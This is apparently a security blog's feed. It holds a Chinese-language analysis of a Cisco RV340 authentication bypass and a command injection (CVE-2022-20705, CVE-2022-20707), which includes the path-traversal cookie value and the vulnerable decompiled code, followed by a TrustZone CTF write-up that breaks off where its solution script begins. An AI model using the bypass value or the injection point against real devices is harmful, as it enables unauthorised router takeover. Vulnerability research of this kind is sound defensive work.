<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Swing&#39;Blog 浮生若梦</title>
  
  <subtitle>努力是为了 站在万人中央 成为别人的光</subtitle>
  <link href="https://bestwing.me/atom.xml" rel="self"/>
  
  <link href="https://bestwing.me/"/>
  <updated>2022-04-03T11:30:35.815Z</updated>
  <id>https://bestwing.me/</id>
  
  <author>
    <name>Swing</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwning a Cisco RV340  漏洞分析（CVE-2022-20705 和 CVE-2022-20707</title>
    <link href="https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html"/>
    <id>https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html</id>
    <published>2022-04-01T16:00:00.000Z</published>
    <updated>2022-04-03T11:30:35.815Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>原作者用到了四个漏洞， 我这里简单分析其中两个，分别是  CVE-2022-20705 和 CVE-2022-20707</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>影响版本： RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img</p><p><a href="https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html">Relyze Software Limited - Advanced Software Analysis: Pwning a Cisco RV340 with a 4 bug chain exploit</a></p><h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><p><a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.26?catid=268437899">Software Download - Cisco Systems</a></p><h2 id="CVE-2022-20705-Improper-Session-Management-Vulnerability"><a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability" class="headerlink" title="CVE-2022-20705 Improper Session Management Vulnerability"></a>CVE-2022-20705 Improper Session Management Vulnerability</h2><p>Nginx 配置不当加上 upload.cgi 对 cookie 两者处理不一致导致的授权绕过。</p><p>首先 nginx 对 upload 模块的 session 的处理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ cat web.upload.conf</span><br><span class="line">location &#x2F;form-file-upload &#123;</span><br><span class="line">include uwsgi_params;</span><br><span class="line">proxy_buffering off;</span><br><span class="line">uwsgi_modifier1 9;</span><br><span class="line">uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">uwsgi_read_timeout 3600;</span><br><span class="line">uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;upload &#123;</span><br><span class="line">set $deny 1;</span><br><span class="line"></span><br><span class="line">        if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">                set $deny &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($deny &#x3D; &quot;1&quot;) &#123;</span><br><span class="line">                return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">upload_pass &#x2F;form-file-upload;</span><br><span class="line">upload_store &#x2F;tmp&#x2F;upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name.name &quot;$upload_file_name&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.content_type &quot;$upload_content_type&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.md5&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.size&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">upload_cleanup 400 404 499 500-505;</span><br><span class="line">upload_resumable on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现， 这里是判断如果 <code>/tmp/websession/token/$cookie_sessionid</code> 文件存在,则返回。  注意这里的 <code>$cookie_sessionid</code> 是由用户在 HTTP 请求中传入的。可以看到这里的文件没有判断是否存在 <code>../../</code>  。因此如果我们跨目录指向一个存在的文件就可能造成授权绕过。像这里作者使用的是  <code>../../../etc/firmware_version</code>。 </p><p>虽然在 <code>upload.cgi</code> 对 HTTP_COOKIE 进行了正则校验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v16 = strcmp_1(REQUEST_URI, <span class="string">&quot;/api/operations/ciscosb-file:form-file-upload&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (v16 != <span class="number">0</span>) &#123;</span><br><span class="line">    v17 = strcmp_1(REQUEST_URI, <span class="string">&quot;/upload&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (v17 == <span class="number">0</span> &amp;&amp; HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if the URI is /upload and we have a sessionid in the cookie</span></span><br><span class="line">        v18 = strlen_1(HTTP_COOKIE);</span><br><span class="line">        <span class="keyword">if</span> (v18 &lt; <span class="number">81</span>) &#123; <span class="comment">// sanity check sessionid characters</span></span><br><span class="line">            v19 = match_regex(<span class="string">&quot;^[A-Za-z0-9+=/]*$&quot;</span>, HTTP_COOKIE);</span><br><span class="line">            <span class="keyword">if</span> (v19 == <span class="number">0</span>) &#123;</span><br><span class="line">                v20 = StrBufToStr(local_0x44);</span><br><span class="line">                func_0x2684(HTTP_COOKIE, content_destination, content_option, content_pathparam, v20, content_cert_name, content_cert_type, content_password);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在程序没有考虑用户在  HTTP cookie 中传入多个 session_id 的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if an cookie is available</span></span><br><span class="line">    StrBufSetStr(cookie_str, HTTP_COOKIE);</span><br><span class="line">    __s2 = StrBufToStr(cookie_str);</span><br><span class="line">    next_semicolon = strtok_r(__s2, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// start to split the semicolon deliminated cookie</span></span><br><span class="line">    HTTP_COOKIE = <span class="number">0</span>; <span class="comment">// this variable will become the sessionid string</span></span><br><span class="line">    <span class="keyword">while</span> (next_semicolon != <span class="number">0</span>) &#123;</span><br><span class="line">        sessionid = <span class="built_in">strstr</span>(next_semicolon, <span class="string">&quot;sessionid=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sessionid != <span class="number">0</span>) &#123; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">            HTTP_COOKIE = sessionid + <span class="number">10</span>; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        next_semicolon = strtok_r(<span class="number">0</span>, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// keep searching</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么如果设置两个 seesionid ， 第一个为 <code>../../../etc/frimware_version</code> ， 第二个为可以通过正则的有效字符。</p><p>最后我们就可以用授权的状态访问 <code>upload.cgi</code> 了。</p><h2 id="CVE-2022-20707-Command-Injection"><a href="#CVE-2022-20707-Command-Injection" class="headerlink" title="CVE-2022-20707 Command Injection"></a>CVE-2022-20707 Command Injection</h2><p>作者在 <code>upload.cgi</code> 里找到了一个命令注入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (json_obj != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">json_str = json_object_to_json_string(json_obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;buff, <span class="string">&quot;curl %s --cookie &#x27;sessionid=%s&#x27; -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;%s&#x27;&quot;</span>, v3, sessionid, json_str);</span><br><span class="line"></span><br><span class="line">debug(<span class="string">&quot;curl_cmd=%s&quot;</span>, &amp;buff);</span><br><span class="line"></span><br><span class="line">__stream = popen(&amp;buff, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__stream != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">fread_1(&amp;buff[<span class="number">2048</span>], <span class="number">2048</span>, <span class="number">1</span>, __stream);</span><br><span class="line"></span><br><span class="line">fclose_1(__stream);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的的 json_str 没有校验， 会造成命令注入。</p><h2 id="Related-vulnerability-tracking"><a href="#Related-vulnerability-tracking" class="headerlink" title="Related vulnerability tracking"></a>Related vulnerability tracking</h2><p>我们之前分析了 CVE-2022-20699-cisco-RV34X 的时候，注意到一个补丁， 修补了 Nginx 的配置不当的漏洞。然后今天和 @leommxj 一起追溯了一下 cisco 的修补历史。</p><h3 id="Firmware-version-1-0-03-19"><a href="#Firmware-version-1-0-03-19" class="headerlink" title="Firmware version 1.0.03.19"></a>Firmware version 1.0.03.19</h3><p>nginx 对调用 upload.cgi 没有任何的校验， 因此可以访问 upload.cgi ， 还出两个漏洞 #CVE-2020-3451 #CVE-2020-3453</p><p>相关的漏洞信息为:</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1100/">ZDI-20-1100 | Zero Day Initiative</a><br><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1101/">ZDI-20-1101 | Zero Day Initiative</a><br><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-osinj-rce-pwTkPCJv">Cisco Small Business RV340 Series Routers Command Injection and Remote Code Execution Vulnerabilities</a></p><h3 id="Firmware-version-1-0-03-21"><a href="#Firmware-version-1-0-03-21" class="headerlink" title="Firmware version 1.0.03.21"></a>Firmware version 1.0.03.21</h3><p>之后有个老哥发现 cisco 虽然加行了授权校验，但是加得不行。</p><p>这加之前和加之后的 diff：<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png"></a></p><p>这个修复有一个致命的缺陷。逻辑是这样的，任何非空的授权标头都会将 $deny 设置为“0”。因此，从字面上发送任何看起来有效的授权标头作为请求/上传的一部分将绕过授权检查。</p><p>相关漏洞信息为： </p><p>#CVE-2021-1473 #CVE-2021-1472<br><a href="https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/">Advisory: Cisco RV34X Series - Authentication Bypass and Remote Command Execution - IoT Inspector (iot-inspector.com)</a></p><h3 id="Firmware-version-1-0-03-22"><a href="#Firmware-version-1-0-03-22" class="headerlink" title="Firmware version 1.0.03.22"></a>Firmware version 1.0.03.22</h3><p>然后这个版本之后去掉了上图 13 行的 nginx 配置。但是出现了此次 <a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> 这个漏洞了。</p><h3 id="Firmware-version-1-0-0-3-26"><a href="#Firmware-version-1-0-0-3-26" class="headerlink" title="Firmware version 1.0.0.3.26"></a>Firmware version 1.0.0.3.26</h3><p>最新版本的 nginx 现在配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;upload &#123;</span><br><span class="line">    set $deny 0;</span><br><span class="line"></span><br><span class="line">    if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($cookie_sessionid ~* &quot;^[a-f0-9]&#123;64&#125;&quot;) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($deny !&#x3D; &quot;012&quot;) &#123;</span><br><span class="line">            return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>增加了一个正则判断。</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>一个点有意思的是， 这<a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> 作者 和 <a href="#Firmware-version-1-0-03-21">CVE-2021-1473</a> 作者用到的命令注入和我当时挖到<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv340-cmdinj-rcedos-pY8J3qfy">两个编号</a> #CVE-2021-1609 和 #CVE-2021-1610  的漏洞点在一行代码里，这意思就是这行代码一共出了 4 个漏洞编号</p><p>以后挖 IoT 漏洞也要多注意一下 web 相关的配置了。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2022-20705" scheme="https://bestwing.me/tags/CVE-2022-20705/"/>
    
    <category term="CVE-2022-20707" scheme="https://bestwing.me/tags/CVE-2022-20707/"/>
    
    <category term="cisco" scheme="https://bestwing.me/tags/cisco/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF-4th TrustZone challenge Writeup</title>
    <link href="https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html"/>
    <id>https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html</id>
    <published>2022-01-23T16:00:00.000Z</published>
    <updated>2022-01-25T05:25:15.845Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>第四届 realworldctf 我和 @chennan 出了三个题目，分别是  <code>Trust or Not</code>, <code>UnTrustZone</code> and <code>Wheels on the Bus</code>， 其中   <code>Trust or Not</code>, <code>UnTrustZone</code>  是和 TrustZone 相关的题目。</p><h2 id="TrustZone-challenge"><a href="#TrustZone-challenge" class="headerlink" title="TrustZone challenge"></a>TrustZone challenge</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" title="image-20220113181523560" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" alt="image-20220113181523560"></a></p><p>TrustZone是基于硬件的安全功能，它通过对原有硬件架构进行修改，在处理器层次引入了两个不同权限的保护域——安全世界和普通世界，任何时刻处理器仅在其中的一个环境内运行。同时这两个世界完全是硬件隔离的，并具有不同的权限，正常世界中运行的应用程序或操作系统访问安全世界的资源受到严格的限制，反过来安全世界中运行的程序可以正常访问正常世界中的资源。这种两个世界之间的硬件隔离和不同权限等属性为保护应用程序的代码和数据提供了有效的机制：通常正常世界用于运行商品操作系统（例如Android、iOS等），该操作系统提供了正常执行环境（Rich Execution Environment，REE）；安全世界则始终使用安全的小内核（TEE-kernel）提供可信执行环境（Trusted Execution Environment，TEE），机密数据可以在TEE中被存储和访问。</p><h3 id="Trust-or-Not"><a href="#Trust-or-Not" class="headerlink" title="Trust or Not"></a>Trust or Not</h3><p>题目描述：</p><blockquote><p>Trust or Not</p><p>Score: <em>357</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Reverse&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>We have lost some of our files and cannot retrieve the plaintext data originally stored.</p><p>Hint: flag file is stored in <code>/data/tee/2</code> securely.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc 47.242.114.24 7788</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/Trust_or_not_fa542592446c43678f685913495da668.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>要解决这个题目，首先要了解什么是安全存储。 数据要么以某种加密/授权的方式存储在linux文件系统<code>/data/tee</code>中，要么存储在Emmc RPMB（Replay Protected Memory Block）分区中。这次的相关题目主要使用了 <code>OP-TEE</code>的开源项目，其更详细的信息可以在<a href="https://github.com/ForgeRock/optee-os/blob/master/documentation/secure_storage.md">OP-TEE文档</a> 中找到。</p><p> **Hardware Unique Key （HUK） ** </p><p>大多数设备都有某种硬件唯一密钥（HUK），主要用于派生其他密钥。例如，当派生密钥用于安全存储等时，可以使用 HUK 派生。HUK 的重要之处在于它需要得到很好的保护，并且在最好的情况下，HUK 永远不应该直接从软件读取，甚至不应该从安全方面读取。有不同的解决方案，加密加速器可能支持它，或者，它可能涉及另一个安全的协处理器。</p><p> <strong>Secure Storage Key （SSK）</strong> </p><p>SSK是每个设备的密钥，在OP-TEE启动时生成并存储在安全内存中。SSK用于派生TA存储密钥（TSK）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSK &#x3D; HMACSHA256 (HUK, Chip ID || “static string”)</span><br></pre></td></tr></table></figure><p>获取硬件唯一密钥（HUK）和芯片ID的功能取决于平台实现。目前，OP-TEE 系统中每台设备只有一把 SSK，用于安全存储子系统。但是，为了将来，我们可能需要为每台设备使用生成 SSK 的相同算法为不同的子系统创建不同的密钥。为不同子系统生成不同的密钥的简单方法是使用不同的静态生成密钥的字符串。</p><p> <strong>Trusted Application Storage Key （TSK）</strong>  </p><p>TA存储密钥</p><p>TSK是每个受信任的应用程序密钥，由SSK和TA的标识符（UUID）生成。它被用来保护FEK，换句话说，用来加密/解密FEK。</p><p>代码实现：<code>build/optee_os/core/tee/tee_fs_key_manager.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uuid) &#123;</span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, uuid, <span class="keyword">sizeof</span>(*uuid));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pick something of a different size than TEE_UUID to</span></span><br><span class="line"><span class="comment"> * guarantee that there&#x27;s never a conflict.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint8_t</span> dummy[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, dummy, <span class="keyword">sizeof</span>(dummy));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_hmac 这里使用的是 HMAC_SHA256</p><p>最后就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSK &#x3D; HMACSHA256 (SSK, TA_UUID)</span><br></pre></td></tr></table></figure><p><strong>File Encryption Key （FEK）</strong> </p><p>当一个新的TEE文件被创建时，密钥管理器将通过 PRNG（pesudo随机数生成器）为TEE文件生成一个新的 FEK，并将加密的 FEK 存储在 meta 文件中。FEK 用于对存储在 meta 文件中的TEE文件信息或块文件中的数据进行加密/解密。</p><h4 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h4><p>通过逆向和比对OP-Tee的源代码，希望选手能发现 <code>HUK</code>没有被设置。然后flag被加密了且存储在 <code>/data/tee/2</code> 文件里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TEE_Result __fastcall <span class="title">tee_otp_get_hw_unique_key</span><span class="params">(tee_hw_unique_key *hwkey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(hwkey, <span class="number">0</span>, <span class="keyword">sizeof</span>(tee_hw_unique_key));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么只要分析下安全存储的过程，可以参考如图：</p><p><a href="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" title="Block Data Encryption" class="gallery-item"><img src="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" alt="Block Data Encryption"></a></p><p>思路就大概是</p><ol><li>通过 <code>HUK </code> 和 <code>chip id</code> 计算出 <code>SSK</code></li><li>通过计算出来的<code>SSk</code> 和 <code>TA UUID</code>计算出 <code>TSK</code></li><li>通过计算出的 <code>TSK</code> 和 被加密的 <code>FEK</code> 计算出明文 <code>FEK</code> </li><li>最后通过 <code>FEK</code> 解出明文的数据</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" title="image-20220124142822275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" alt="image-20220124142822275"></a></p><p>其中被加密的 <code>FEK</code> 存储在 <code>/data/tee/2</code> 文件中，可以参考如下 010 tempte结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">&#x2F;&#x2F;--- 010 Editor v10.0.2 Binary Template</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;      File: </span><br><span class="line">&#x2F;&#x2F;   Authors: </span><br><span class="line">&#x2F;&#x2F;   Version: </span><br><span class="line">&#x2F;&#x2F;   Purpose: </span><br><span class="line">&#x2F;&#x2F;  Category: </span><br><span class="line">&#x2F;&#x2F; File Mask: </span><br><span class="line">&#x2F;&#x2F;  ID Bytes: </span><br><span class="line">&#x2F;&#x2F;   History: </span><br><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_FEK_SIZE 16</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_meta &#123;</span><br><span class="line">UINT64 length;</span><br><span class="line">&#125;tee_fs_htree_meta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_imeta &#123;</span><br><span class="line">struct tee_fs_htree_meta meta;</span><br><span class="line">UINT32 max_node_id;</span><br><span class="line">    UINT32 nop;</span><br><span class="line">&#125;tee_fs_htree_imeta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_image &#123;</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">UCHAR enc_fek[TEE_FS_HTREE_FEK_SIZE];</span><br><span class="line">UCHAR imeta[sizeof(struct tee_fs_htree_imeta)];</span><br><span class="line">UINT32 counter;</span><br><span class="line">&#125;tee_fs_htree_image;</span><br><span class="line"></span><br><span class="line">#define TEE_FS_HTREE_HASH_SIZE32</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">typedef struct _tee_fs_htree_node_image &#123;</span><br><span class="line">&#x2F;* Note that calc_node_hash() depends on hash first in struct *&#x2F;</span><br><span class="line">UCHAR hash[TEE_FS_HTREE_HASH_SIZE];</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">USHORT flags;</span><br><span class="line">&#125;tee_fs_htree_node_image;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;--------------------------------------</span><br><span class="line">LittleEndian();</span><br><span class="line"></span><br><span class="line">tee_fs_htree_image  ver0_head;</span><br><span class="line">tee_fs_htree_image  ver1_head;</span><br><span class="line">FSeek(0x1000);</span><br><span class="line">tee_fs_htree_node_image ver0_root_node;</span><br><span class="line">tee_fs_htree_node_image ver1_root_node;</span><br><span class="line">FSeek(0x2000);</span><br></pre></td></tr></table></figure><h4 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h4><p>最后脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 